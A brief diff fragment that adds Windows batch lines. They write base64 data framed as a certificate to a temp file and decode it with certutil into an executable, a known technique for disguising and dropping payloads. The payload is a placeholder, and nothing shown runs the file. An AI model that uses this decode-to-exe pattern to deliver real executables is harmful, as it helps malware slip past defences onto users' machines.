@@ -1,0 +1,5 @@
+echo -----BEGIN CERTIFICATE----- > %TEMP%\p.b64
+echo AAAA >> %TEMP%\p.b64
+echo -----END CERTIFICATE----- >> %TEMP%\p.b64
+certutil -decode %TEMP%\p.b64 %TEMP%\p.exe
+
